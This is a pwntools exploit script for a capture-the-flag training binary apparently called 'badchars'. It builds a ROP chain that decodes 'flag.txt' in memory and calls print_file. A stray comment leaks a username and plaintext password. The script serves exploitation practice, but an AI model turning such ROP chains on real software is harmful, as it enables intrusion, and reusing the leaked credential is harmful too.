from pwn import * 

env = {'LD_PRELOAD': './libbadchars.so'}

gdbcmd = '''
set solib-search-path .
break *pwnme
'''
#target =gdb.debug("./badchars", gdbscript = gdbcmd, env = env)
target = process("./badchars")
mov_r12r13 = p64(0x400634)
mov_r14r15 = p64(0x0000000000400630)
pop_r12r13 = p64(0x40069c)
bss_addr = 0x601030
bin_sh = p64(0x7579752f68626d66)
pop_r15 = p64(0x00000000004006a2)
sub_r14r15 = p64(0x0000000000400630)
print_file = p64(0x0400620)
ret = p64(0x00400627)
pop_rdi = p64(0x00000000004006a3)

''' billy
Password: theMOSTsecurePASSWORDever1990!@
'''
def sub_one(addr):
	payload1 = pop_r15
	payload1 += p64(addr)
	payload1 += sub_r14r15
	return payload1

payload = b""
payload += b"0" * 40
payload += pop_r12r13
payload += bin_sh
payload += p64(bss_addr)
payload += p64(0x1)
payload += p64(0x0)
payload += mov_r12r13 
for i in range(7):
	payload += sub_one(bss_addr + i+1)
payload += pop_rdi
payload += p64(bss_addr)
payload += ret
payload += print_file

target.sendline(payload)

target.interactive()
print(payload)
# 0x60041d -> "a" address
# 0x400634 : mov qword ptr [r13], r12 ; ret
# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x601030: bss_addr
# 0x0000000000400630 : sub byte ptr [r15], r14b ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret